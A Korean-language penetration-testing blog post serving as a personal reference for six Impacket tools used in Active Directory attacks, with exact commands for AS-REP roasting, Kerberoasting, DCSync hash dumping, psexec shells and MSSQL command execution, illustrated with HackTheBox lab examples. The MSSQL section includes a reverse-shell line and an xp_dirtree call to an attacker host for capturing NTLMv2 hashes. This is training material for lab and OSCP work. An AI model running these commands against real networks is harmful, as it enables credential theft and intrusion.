---
title: "Impacket — 내가 실제로 쓰는 도구들"
date: 2026-03-24
weight: 20
draft: false
tags: ["impacket", "active-directory", "kerberos", "lateral-movement"]
summary: "실제 침투 테스트에서 반복해서 쓰는 Impacket 도구와 옵션 정리."
---

Impacket 은 네트워크 프로토콜을 다루는 Python 도구 모음이다. 실무에서 AD 침투 테스트를 위해 나는 그중 6개를 끊임없이 쓴다. 이 6개에 대한 레퍼런스다 — 무엇을 하는지, 언제 쓰는지, 내가 실행하는 정확한 명령.

Kali 에 기본 설치된다. 모든 도구 이름 앞에 `impacket-` 이 붙는다.

## impacket-GetNPUsers — AS-REP Roasting

**하는 일:** Kerberos pre-authentication 이 비활성화된 계정을 찾고 그들의 AS-REP 해시를 덤프한다. 자격 증명 불필요 — 유효한 사용자명 목록만 있으면 된다.

**언제 쓰나:** 모든 AD 박스에서 가장 먼저 시도한다. brute force 하기 전에, 뭐든 하기 전에. pre-auth 가 비활성화된 계정이 있으면 해시를 공짜로 얻는다.

### 기본 사용법

```bash
# 사용자명 목록으로 (자격 증명 불필요)
impacket-GetNPUsers DOMAIN.local/ -dc-ip $ip -usersfile users.txt -format hashcat -outputfile asrep.txt

# 유효한 자격 증명으로 (취약한 모든 사용자를 자동 열거)
impacket-GetNPUsers DOMAIN.local/user:'password' -dc-ip $ip -request -format hashcat -outputfile asrep.txt
```

### 주요 플래그

| 플래그 | 하는 일 |
| --- | --- |
| `-usersfile` | 테스트할 사용자명 목록 (줄당 하나) |
| `-format hashcat` | hashcat 형식 출력 (mode 18200). john 은 `-format john` |
| `-outputfile` | 해시를 파일에 저장 |
| `-request` | 실제로 TGT 요청 (자격 증명 사용 시 필요) |
| `-dc-ip` | 대상 DC IP |

### 해시 크랙

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Gotchas

- **자격 증명 없는 변형은 사용자명 목록이 필요하다.** 먼저 사용자명을 열거해야 한다 — SMB null session, LDAP, kerbrute 등.

- **자격 증명 있는 변형은 취약한 모든 계정을 자동으로 찾는다.** 사용자명 목록이 필요 없다.

- `echo` 로 해시를 저장할 때 **작은따옴표**를 쓴다. 큰따옴표는 해시의 `$` 문자를 망가뜨린다. Forest 에서 이걸 디버깅하느라 시간을 낭비했다.

### 내가 쓴 곳

- **Forest** — 자격 증명 없이 `svc-alfresco` 를 AS-REP Roasting. 해시를 얻고 `s3rvice` 로 크랙. 그게 전체 foothold 였다.

- **Blackfield** — 같은 것. `profiles$` SMB 공유에서 ~300 사용자명을 수집하고 GetNPUsers 에 넣어 `support` 계정의 해시를 얻었다.

---

## impacket-GetUserSPNs — Kerberoasting

**하는 일:** SPN (Service Principal Name) 이 설정된 계정을 찾고 그들의 TGS 티켓을 요청한다. 티켓은 계정의 비밀번호 해시로 암호화된다 — 티켓을 크랙하면 비밀번호를 크랙한다.

**언제 쓰나:** 유효한 도메인 자격 증명이 하나라도 생기는 즉시. 어떤 인증된 사용자든 Kerberoast 할 수 있다. 항상 시도할 가치가 있다.

### 기본 사용법

```bash
# SPN 만 열거
impacket-GetUserSPNs DOMAIN.local/user:'password' -dc-ip $ip

# 열거 AND 티켓 요청
impacket-GetUserSPNs DOMAIN.local/user:'password' -dc-ip $ip -request -outputfile kerberoast.txt
```

### 주요 플래그

| 플래그 | 하는 일 |
| --- | --- |
| `-request` | 실제로 TGS 티켓을 요청 (이게 없으면 SPN 목록만 나온다) |
| `-outputfile` | 해시를 파일에 저장 |
| `-dc-ip` | 대상 DC IP |

### 해시 크랙

```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
# 또는
john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Gotchas

- **먼저 유효한 자격 증명이 필요하다.** AS-REP Roasting 과 달리 Kerberoasting 은 인증이 필요하다.

- 머신 계정과 managed service account 는 보통 랜덤 128자 비밀번호를 가진다. **SPN 이 있는 사용자 계정**에 집중한다 — 크랙 가능한 비밀번호를 가진 것들.

- `-request` 를 잊기 쉽다. 없으면 SPN 목록만 나오고 실제 해시는 없다.

### 내가 쓴 곳

- **Active** — GPP 에서 SVC_TGS 자격 증명을 얻은 후 Administrator 계정을 Kerberoasting. SPN 은 `active/CIFS:445` 였다. `Ticketmaster1968` 으로 크랙. 게임 끝.

---

## impacket-secretsdump — DCSync, SAM, NTDS.dit

**하는 일:** 자격 증명을 덤프한다. 무엇을 넣느냐에 따라 여러 가지를 한다:

- **원격 DCSync** — 도메인 컨트롤러 복제 요청을 흉내 내어 모든 도메인 해시를 뽑는다

- **로컬 SAM 덤프** — SAM + SYSTEM 레지스트리 하이브에서 해시 추출

- **로컬 NTDS.dit 덤프** — AD 데이터베이스 파일에서 해시 추출

### 원격 DCSync

```bash
# 비밀번호로
impacket-secretsdump DOMAIN.local/user:'password'@$ip

# NTLM 해시로 (pass-the-hash)
impacket-secretsdump DOMAIN.local/user@$ip -hashes :NTLM_HASH
```

**DCSync 권한** 필요 — Replicating Directory Changes + Replicating Directory Changes All. Domain Admins 는 기본적으로 가진다. Forest 에서는 WriteDACL 악용으로 svc-alfresco 에 이 권한을 부여한 후 secretsdump 를 실행했다.

### 로컬 NTDS.dit 덤프

```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

NTDS.dit 와 SYSTEM 하이브 파일을 이미 잡았을 때 (VSS 스냅샷, robocopy 등으로) 이것으로 오프라인 파싱한다. 네트워크 연결 필요 없음.

### 주요 플래그

| 플래그 | 하는 일 |
| --- | --- |
| `-ntds` | NTDS.dit 파일 경로 |
| `-system` | SYSTEM 레지스트리 하이브 경로 |
| `-hashes` | Pass-the-hash 인증 (`:NTLM_HASH` 형식 — 빈 LM 해시) |
| `-just-dc-ntlm` | NTLM 해시만 덤프 (더 빠르고 노이즈 적음) |
| `-just-dc-user USER` | 특정 사용자만 덤프 |
| `LOCAL` | 원격 연결 대신 로컬 파일 파싱 |

### Gotchas

- **원격 DCSync 는 시끄럽다.** 특정 Windows 이벤트를 생성한다 (복제 GUID 가 있는 4662). 실제 engagement 에서는 SOC 분석가 (예전의 나처럼) 가 이를 플래그할 것이다. 노이즈를 최소화하려면 `-just-dc-ntlm` 또는 `-just-dc-user` 를 쓴다.

- 출력의 해시 형식은 `LM:NTLM` 이다. pass-the-hash 에는 두 번째 콜론 뒤의 NTLM 부분만 필요하다.

- 로컬 파싱에는 NTDS.dit **와** SYSTEM 이 둘 다 필요하다. SYSTEM 에는 해시를 복호화하는 boot key 가 있다.

### 내가 쓴 곳

- **Forest** — WriteDACL 을 통해 svc-alfresco 에 DCSync 권한을 부여한 후 원격 DCSync. `impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@$ip` 가 Administrator NTLM 해시를 뽑았다.

- **Blackfield** — 로컬 NTDS.dit 덤프. VSS 스냅샷과 robocopy /b 로 ntds.dit + SYSTEM 을 잡고 `impacket-secretsdump -ntds ntds.dit -system system LOCAL`. 도메인의 모든 해시를 얻었다.

---

## impacket-psexec — 자격 증명으로 쉘

**하는 일:** 유효한 자격 증명으로 원격 Windows 박스에서 SYSTEM 쉘을 준다. SMB (포트 445) 로 동작한다. 서비스 바이너리를 업로드하고, Windows 서비스를 생성하고, 시작하고, 쉘을 준 다음 종료 시 정리한다.

### 기본 사용법

```bash
# 비밀번호로
impacket-psexec DOMAIN.local/Administrator:'password'@$ip

# NTLM 해시로
impacket-psexec DOMAIN.local/Administrator@$ip -hashes :NTLM_HASH
```

### 주요 플래그

| 플래그 | 하는 일 |
| --- | --- |
| `-hashes` | Pass-the-hash (`:NTLM_HASH` 형식) |
| `-target-ip` | 호스트명 해석이 이상할 때 유용 |

### Gotchas

- **admin 급 자격 증명** 과 `ADMIN$` 또는 `C$` 공유에 대한 쓰기 접근이 필요하다. 일반 도메인 사용자 자격 증명은 동작하지 않는다.

- **Windows 서비스를 생성한다** — 탐지 가능하다. AV/EDR 가 플래그할 수 있다. OSCP 에서는 상관없다. 실제 engagement 에서는 `evil-winrm` (WinRM, 포트 5985) 또는 `impacket-wmiexec` 같은 대안을 고려한다.

- 쉘은 인증한 사용자가 아니라 **NT AUTHORITY\SYSTEM** 으로 떨어진다.

- 걸리거나 실패하면 서비스가 정리되지 않았을 수 있다. 서비스가 제거되기 전까지 후속 시도가 실패할 수 있다.

### 대안

| 도구 | 프로토콜 | 은밀성 | 비고 |
| --- | --- | --- | --- |
| `impacket-psexec` | SMB (445) | 낮음 | 서비스 생성, SYSTEM 쉘 |
| `impacket-wmiexec` | WMI (135) | 중간 | 서비스 생성 없음, 사용자로 실행 |
| `impacket-smbexec` | SMB (445) | 중간 | 서비스를 쓰지만 다르게 |
| `evil-winrm` | WinRM (5985) | 더 높음 | PowerShell, WinRM 활성화 필요 |

### 내가 쓴 곳

- **Active** — Kerberoasting 후 최종 쉘을 위한 `impacket-psexec active.htb/Administrator:'Ticketmaster1968'@$ip`.

---

## impacket-mssqlclient — MSSQL 접근

**하는 일:** 대화형 MSSQL 클라이언트. Microsoft SQL Server 에 연결하고 쿼리를 실행하며 OS 명령 실행을 위해 `xp_cmdshell` 을 활성화하고 사용한다.

### 기본 사용법

```bash
# Windows 인증
impacket-mssqlclient user:'password'@$ip -windows-auth

# SQL 인증 (기본)
impacket-mssqlclient user:'password'@$ip
```

### 내장 명령

연결되면 다음이 핵심 명령이다:

```sql
-- sysadmin 인지 확인
SELECT IS_SRVROLEMEMBER('sysadmin')

-- xp_cmdshell 활성화 (sysadmin 전용)
enable_xp_cmdshell

-- OS 명령 실행
xp_cmdshell 'whoami'

-- 리버스 쉘
xp_cmdshell 'powershell -e <BASE64_PAYLOAD>'

-- NTLMv2 해시 탈취 (sysadmin 없어도 동작)
xp_dirtree '\\YOUR_IP\share'
```

### 주요 플래그

| 플래그 | 하는 일 |
| --- | --- |
| `-windows-auth` | SQL auth 대신 Windows/도메인 인증 사용 |
| `-port` | MSSQL 이 1433 이 아닐 때 커스텀 포트 |

### Gotchas

- **`-windows-auth` 가 중요하다.** SQL auth 와 Windows auth 는 다르다. 하나가 실패하면 다른 것을 시도한다. Querier 에서는 `-windows-auth` 없이 연결이 실패했다.

- **`$` 가 있는 비밀번호는 bash 에서 작은따옴표가 필요하다.** `'PcwTWTHRwryjc$c6'` 는 동작한다. `"PcwTWTHRwryjc$c6"` 는 동작하지 않는다 — bash 가 `$c6` 를 변수로 해석하고 비밀번호를 망가뜨린다.

- **`enable_xp_cmdshell` 은 sysadmin 역할이 필요하다.** 사용자가 sysadmin 이 아니면 명령이 조용히 실패하거나 오류를 낸다. `xp_dirtree` + Responder 로 서비스 계정의 NTLMv2 해시를 탈취하는 fallback 을 쓴다.

- **xp_dirtree + Responder** 는 xp_cmdshell 이 거부될 때의 fallback 이다. SQL 서버가 내 머신에 SMB 연결을 하고 Responder 가 해시를 잡는다. NTLMv2 용 hashcat mode 5600.

### 내가 쓴 곳

- **Querier** — VBA 매크로 creds 로 `-windows-auth` 를 써서 연결. Reporting 사용자는 xp_cmdshell 을 실행할 수 없었기에 xp_dirtree + Responder 로 서비스 계정의 NTLMv2 해시를 탈취했다. 크랙하고 sysadmin 으로 재연결하고 xp_cmdshell 을 활성화하고 쉘을 얻었다.

---

## impacket-smbclient — SMB 파일 접근

**하는 일:** 공유의 파일을 브라우징하고 다운로드하는 대화형 SMB 클라이언트. Samba 의 `smbclient` 와 비슷하지만 Impacket 의 인증 스택을 쓴다.

### 기본 사용법

```bash
# 비밀번호로
impacket-smbclient DOMAIN.local/user:'password'@$ip

# NTLM 해시로
impacket-smbclient DOMAIN.local/user@$ip -hashes :NTLM_HASH

# Null session
impacket-smbclient DOMAIN.local/''@$ip -no-pass
```

### 주요 명령

```bash
shares          # 사용 가능한 공유 목록
use SHARE_NAME  # 공유에 연결
ls              # 파일 목록
get file.txt    # 파일 다운로드
cd directory    # 디렉터리 변경
```

### Gotchas

- 초기 열거에는 보통 `smbclient` (Samba 것) 나 `nxc smb --shares` 를 쓴다. Impacket 의 smbclient 는 Impacket 인증 (pass-the-hash, Kerberos 티켓) 이 필요할 때 유용하다.

- 큰 파일 다운로드에는 Samba 의 `smbclient` 가 더 신뢰할 만하다. Impacket 버전은 큰 파일에서 막힐 수 있다.

---

## 빠른 참조 — 언제 무엇을 쓰나

| 상황 | 도구 | 자격 증명 필요? |
| --- | --- | --- |
| AS-REP Roastable 사용자 확인 | `impacket-GetNPUsers` | 아니오 (사용자 목록으로) |
| Kerberoastable 사용자 확인 | `impacket-GetUserSPNs` | 예 |
| 모든 도메인 해시 덤프 (DCSync) | `impacket-secretsdump` | 예 (DCSync 권한) |
| NTDS.dit 오프라인 파싱 | `impacket-secretsdump -ntds ... LOCAL` | 아니오 |
| SYSTEM 쉘 얻기 | `impacket-psexec` | 예 (admin) |
| MSSQL 연결 | `impacket-mssqlclient` | 예 |
| SMB 공유 브라우징 | `impacket-smbclient` | 경우에 따라 |

---

## 내 AD 정찰 순서

AD 박스에서 이 도구들을 대략 이 순서로 실행한다:

1. **GetNPUsers** — AS-REP Roast 먼저. 자격 증명 불필요. 취약하면 공짜 해시.

2. **GetUserSPNs** — 유효한 자격 증명이 하나라도 생기면 Kerberoast.

3. **secretsdump** — Domain Admin 또는 DCSync 권한을 얻으면 DCSync.

4. **psexec** — admin 해시 또는 비밀번호로 최종 쉘.

나머지 (mssqlclient, smbclient) 는 박스가 요구할 때 쓴다.

> **내가 푼 모든 AD 박스의 패턴:** 사용자 열거 → AS-REP Roast → 첫 자격 증명 → BloodHound → 경로 찾기 → 경로 따라가기 → secretsdump → psexec → 끝.

- [Impacket](https://heretek.dev/tags/impacket/)
- [Active-Directory](https://heretek.dev/tags/active-directory/)
- [Kerberos](https://heretek.dev/tags/kerberos/)
- [Lateral-Movement](https://heretek.dev/tags/lateral-movement/)